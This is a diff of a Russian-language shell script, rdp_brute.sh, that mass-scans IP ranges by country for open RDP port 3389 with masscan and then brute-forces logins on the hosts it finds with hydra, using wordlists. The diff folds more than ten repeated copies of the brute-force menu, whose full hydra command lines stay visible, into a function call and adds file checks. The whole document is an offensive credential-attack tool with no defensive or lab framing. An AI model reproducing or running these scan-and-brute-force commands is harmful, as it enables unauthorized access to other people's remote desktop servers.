@@ -6033,53 +2551,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6097,6 +2569,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6106,53 +2579,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6170,6 +2597,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6179,53 +2607,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "81" ]; then
@@ -6242,6 +2624,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6251,53 +2634,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "82" ]; then
@@ -6314,6 +2651,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6323,53 +2661,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6387,6 +2679,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6396,53 +2689,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6460,6 +2707,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6469,53 +2717,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6533,6 +2735,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6542,53 +2745,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6606,6 +2763,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6615,53 +2773,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6679,6 +2791,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6688,53 +2801,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6752,6 +2819,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6761,53 +2829,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6825,6 +2847,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6834,53 +2857,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6898,6 +2875,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6907,53 +2885,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -6971,6 +2903,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -6980,53 +2913,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
